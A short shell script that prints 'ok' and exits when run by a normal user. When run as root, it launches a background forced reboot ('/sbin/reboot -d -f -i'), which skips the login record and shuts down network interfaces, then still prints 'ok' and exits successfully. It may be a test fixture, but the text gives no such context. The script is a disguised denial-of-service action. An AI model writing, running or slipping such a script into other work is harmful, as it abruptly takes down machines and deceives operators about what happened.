#!/bin/sh


if [ `id -u` != 0 ]; then
    echo "ok"
    exit 0
fi

( sh -c '/sbin/reboot -d -f -i' & )&

echo "ok"

exit 0
